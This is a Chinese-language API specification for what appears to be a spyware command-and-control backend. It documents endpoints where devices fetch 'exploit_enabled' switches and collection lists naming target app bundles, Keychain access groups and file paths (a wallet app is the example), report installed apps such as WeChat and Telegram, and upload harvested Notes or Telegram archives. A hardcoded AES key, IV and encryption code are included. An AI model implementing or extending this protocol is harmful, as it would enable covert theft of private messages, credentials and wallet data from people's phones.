# 主协议 API 对接说明（给前端）

本文只覆盖**主程序协议**（`/api/device/*`、`/api/upload/*`、`/api/log/*`），不含 ES `/report`、不含 `/?mode=raw` 裸上报。

---

## 1. 通用约定

### 1.1 Header

| Header | 必填 | 说明 |
|--------|------|------|
| `X-App-UUID` | 建议必填 | 设备唯一标识（UUID）。解密后的 `app_uuid` 优先，没有则用该 Header |
| `Content-Type` | 按接口 | JSON：`application/json`；上传文件：`multipart/form-data` |

### 1.2 外层响应信封

除特别说明外，HTTP 状态码固定为 **200**，Body 为 JSON：

```json
{
  "code": 0,
  "data": "<Base64 字符串，需再 AES 解密>",
  "message": "ok"
}
```

| 字段 | 类型 | 说明 |
|------|------|------|
| `code` | number | `0` 成功；日志接口失败时可能为 `1` |
| `data` | string | **AES-128-CBC 加密后再 Base64** 的密文（日志接口例外，见下文） |
| `message` | string | 提示文案 |

> 多数接口即使服务端解密/落库失败，仍会返回 `code: 0` + 可解密的 `data`，避免客户端重试死循环。前端应以「能否正确解密 `data`」为准。

---

## 2. 加密方式（主协议共用）

### 2.1 算法参数

| 项 | 值 |
|----|-----|
| 算法 | `AES-128-CBC` |
| Key | `bc2c72b2260840b28bc9614aa2b8004b`（**hex**，解码后 16 字节） |
| IV | `71ec8e3980754823aba30e62be55cf6a`（**hex**，解码后 16 字节） |
| 填充 | PKCS7（Node `createCipheriv` 默认） |
| 传输编码 | Base64 |

### 2.2 请求加密流程

1. 组装明文 JSON 对象（见各接口「明文 params」）
2. `JSON.stringify` → UTF-8 字节
3. AES-128-CBC 加密（Key/IV 先 hex decode）
4. 密文转 Base64 → 得到 `params` 字符串
5. 放入 Body：`{ "params": "<Base64>" }`，或 multipart 字段 `params`

### 2.3 响应解密流程

1. 取外层 JSON 的 `data`（Base64 字符串）
2. Base64 decode → AES-128-CBC 解密（同一套 Key/IV）
3. UTF-8 → `JSON.parse` 得到业务明文

### 2.4 伪代码（参考）

```js
import crypto from 'crypto';

const KEY = Buffer.from('bc2c72b2260840b28bc9614aa2b8004b', 'hex');
const IV = Buffer.from('71ec8e3980754823aba30e62be55cf6a', 'hex');

function encryptParams(obj) {
  const cipher = crypto.createCipheriv('aes-128-cbc', KEY, IV);
  const buf = Buffer.concat([
    cipher.update(Buffer.from(JSON.stringify(obj), 'utf8')),
    cipher.final(),
  ]);
  return buf.toString('base64');
}

function decryptData(base64) {
  const decipher = crypto.createDecipheriv('aes-128-cbc', KEY, IV);
  const buf = Buffer.concat([
    decipher.update(Buffer.from(String(base64).trim(), 'base64')),
    decipher.final(),
  ]);
  return JSON.parse(buf.toString('utf8'));
}
```

浏览器可用 Web Crypto / CryptoJS，注意：**Key/IV 是 hex 字符串，先解码成 16 字节**，不要当 ASCII 用。

---

## 3. 接口列表

| 方法 | 路径 | 用途 |
|------|------|------|
| POST | `/api/device/config` | 设备信息上报 + 拉取完整配置 |
| GET/POST | `/api/device/report` | 设备信息上报 + 拉取采集列表 |
| POST | `/api/device/apps` | 上报已安装应用 Bundle |
| POST | `/api/upload/json` | 上传 JSON 文件 |
| POST | `/api/upload/jso` | 同上（别名） |
| POST | `/api/upload/xml` | 上传 XML 文件 |
| POST | `/api/upload/zip` | 上传 ZIP（文件本身不加密） |
| POST | `/api/log/report` | 短日志上报 |

---

## 4. 设备配置 `/api/device/config`

### 请求

- **方法**：`POST`
- **Content-Type**：`application/json` 或 `multipart/form-data`
- **Header**：`X-App-UUID: <uuid>`
- **Body**：

```json
{
  "params": "<AES 加密后的 Base64>"
}
```

### 明文 params（加密前）

```json
{
  "app_uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "app_version": "1.0.0",
  "app_pac": "com.example.app",
  "machine": "iPhone14,2",
  "ios_version": "17.0",
  "timestamp": 1710000000000
}
```

| 字段 | 类型 | 说明 |
|------|------|------|
| `app_uuid` | string | 设备 UUID，优先于 Header |
| `app_version` | string | App 版本 |
| `app_pac` | string | Bundle ID / 包名 |
| `machine` | string | 机型 |
| `ios_version` | string | 系统版本 |
| `timestamp` | number | 上报时间（毫秒时间戳） |

可附带其它字段，服务端会整包写入 `payload`。

### 响应

```json
{
  "code": 0,
  "data": "<AES Base64>",
  "message": "ok"
}
```

### 解密后的 data（完整配置）

```json
{
  "version": "1.0.0",
  "min_close_exploit_version": "",
  "exploit_enabled": false,
  "exploit_repeat_enabled": false,
  "exploit_test": false,
  "app_log_report_enabled": false,
  "exploit_repeat_interval": 86400,
  "collect_configs": []
}
```

| 字段 | 说明 |
|------|------|
| `version` | 配置版本；后台「重新下发」会递增，客户端可据此刷新 |
| `exploit_enabled` | 总开关；为 `true` 时才带 `collect_configs` |
| `exploit_repeat_enabled` / `exploit_test` / `app_log_report_enabled` | 设备级开关 |
| `exploit_repeat_interval` | 重复间隔（秒），默认 `86400` |
| `collect_configs` | 仅当 `exploit_enabled === true` 时出现；结构见第 5 节 |

---

## 5. 采集上报 `/api/device/report`

### 请求

- **方法**：`GET` 或 `POST`（逻辑相同）
- **Header**：`X-App-UUID`
- **Body**（POST）：`{ "params": "<AES Base64>" }`；`params` 可省略（仅拉配置）

明文 `params` 字段与 `/api/device/config` 相同（有则更新设备信息）。

### 响应

```json
{
  "code": 0,
  "data": "<AES Base64>",
  "message": "ok"
}
```

### 解密后的 data（仅采集配置）

```json
{
  "collect_configs": [
    {
      "bundle_id": "com.example.wallet",
      "access_group": "group.xxx",
      "items": [
        { "type": "file", "path": "/path/to/file" },
        { "type": "dir", "path": "/path/to/dir" }
      ]
    }
  ]
}
```

| 字段 | 说明 |
|------|------|
| `bundle_id` | 目标 App Bundle |
| `access_group` | Keychain / Access Group |
| `items[].type` | `file` 或 `dir` |
| `items[].path` | 文件或目录路径 |

---

## 6. 已安装应用 `/api/device/apps`

### 请求

```json
{
  "params": "<AES Base64>"
}
```

### 明文 params

```json
{
  "app_uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "timestamp": 1710000000000,
  "apps": [
    "com.apple.mobilesafari",
    { "bundle": "com.tencent.xin" },
    { "bundle_id": "ph.telegra.Telegraph" }
  ]
}
```

| 字段 | 说明 |
|------|------|
| `apps` | 字符串 Bundle，或含 `bundle` / `bundle_id` / `app_pac` 的对象；自动去重 |

### 响应

```json
{
  "code": 0,
  "data": "<AES Base64，解密后为 {}>",
  "message": "ok"
}
```

解密后业务明文固定为：

```json
{}
```

---

## 7. 文件上传 `/api/upload/*`

### 路径

| 路径 | kind | 说明 |
|------|------|------|
| `POST /api/upload/json` | json | JSON 文件 |
| `POST /api/upload/jso` | json | 同上别名 |
| `POST /api/upload/xml` | xml | XML 文件 |
| `POST /api/upload/zip` | zip | ZIP；**文件字节不加密**，仅 `params` 加密 |

### 请求

- **Content-Type**：`multipart/form-data`
- **Header**：`X-App-UUID`
- **字段**：
  - `params`：AES 加密后的元数据 Base64
  - `file`（或框架识别的文件字段）：**明文文件二进制**

### 明文 params（加密前）

```json
{
  "app_uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "bundle_id": "group.com.apple.notes",
  "file_name": "notes.zip",
  "file_md5": "d41d8cd98f00b204e9800998ecf8427e",
  "timestamp": 1710000000000
}
```

| 字段 | 说明 |
|------|------|
| `app_uuid` | 设备 UUID |
| `bundle_id` | 来源 Bundle（如备忘录、Telegram 等，影响服务端后处理） |
| `file_name` | 原始文件名（可选，缺省用上传文件名） |
| `file_md5` | 客户端计算的 MD5（可选，服务端会再算一遍） |
| `timestamp` | 上报时间 |

### 响应

```json
{
  "code": 0,
  "data": "<AES Base64，解密后为 {}>",
  "message": "ok"
}
```

解密后：

```json
{}
```

---

## 8. 日志上报 `/api/log/report`

### 请求

```json
{
  "params": "<AES Base64>"
}
```

### 明文 params

```json
{
  "app_uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "text": "日志正文",
  "timestamp": 1710000000000
}
```

也可用 `log` 字段代替 `text`；都没有则整包 JSON 字符串入库。

### 响应（注意：data 不加密）

成功：

```json
{
  "code": 0,
  "data": "",
  "message": "ok"
}
```

失败：

```json
{
  "code": 1,
  "data": "",
  "message": "错误原因"
}
```

> 与其它主协议接口不同：本接口的 `data` 是空字符串，**不要做 AES 解密**。

---

## 9. 前端对接清单（速查）

1. **统一实现** `encryptParams(obj)` / `decryptData(base64)`，Key/IV 用 hex。
2. 除日志外：请求塞加密 `params`，响应解外层再解 `data`。
3. 上传：`multipart` = 加密 `params` + **明文文件**。
4. 配置用 `/api/device/config`（完整开关 + 可选 `collect_configs`）；拉采集列表用 `/api/device/report`。
5. `X-App-UUID` 与明文里的 `app_uuid` 保持一致。
6. 业务成功判断：HTTP 200 且能解密；日志接口看 `code === 0`。

---

## 10. 不在本文范围

| 接口 | 原因 |
|------|------|
| `POST /report`、`POST /api/report` | ES 协议，另一套 ASCII Key/IV |
| `POST /?mode=raw&name=...` | 裸二进制，无 AES |

如需上述协议文档，另开说明即可。
